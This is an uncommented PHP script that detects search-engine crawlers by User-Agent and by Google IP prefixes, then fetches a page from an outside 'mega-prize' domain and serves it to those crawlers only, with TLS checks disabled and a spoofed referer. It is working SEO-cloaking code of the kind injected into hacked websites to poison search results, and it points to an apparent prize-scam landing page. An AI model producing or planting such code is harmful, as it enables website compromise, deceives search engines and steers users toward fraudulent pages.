<?php

@ob_start();
header("Vary: User-Agent");

$userAgent   = $_SERVER['HTTP_USER_AGENT'] ?? '';
$userIp      = $_SERVER['REMOTE_ADDR'] ?? '';
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';

$bot_signatures = [
    'Googlebot',
    'Google-InspectionTool',
    'Mediapartners-Google',
    'AdsBot-Google',
    'Bingbot',
    'Slurp',
    'DuckDuckBot',
    'AhrefsBot',
    'SEMRushBot',
    'MJ12bot',
    'YandexBot'
];

function isBotUserAgent($ua, $signatures) {
    foreach ($signatures as $bot) {
        if (stripos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function isRealGoogleIp($ip) {
    $ranges = [
        '66.249.', '74.125.', '64.233.', '72.14.',
        '209.85.', '108.177.', '35.191.'
    ];
    foreach ($ranges as $prefix) {
        if (strpos($ip, $prefix) === 0) {
            return true;
        }
    }
    return false;
}

function fetchContentCurl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        CURLOPT_REFERER        => 'https://www.google.com/',
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content ?: '';
}

$is_bot_ua = isBotUserAgent($userAgent, $bot_signatures);
$is_real_google_ip = isRealGoogleIp($userIp);
$targetUrl = "https://mega-prize.org/landing/botanic.html";

if ($is_bot_ua && $is_real_google_ip) {
    usleep(random_int(100000, 200000));
    $cloakedContent = fetchContentCurl($targetUrl);

    if ($cloakedContent) {
        if (ob_get_level() > 0) {
            ob_end_clean();
        }
        echo $cloakedContent;
        exit;
    }
}
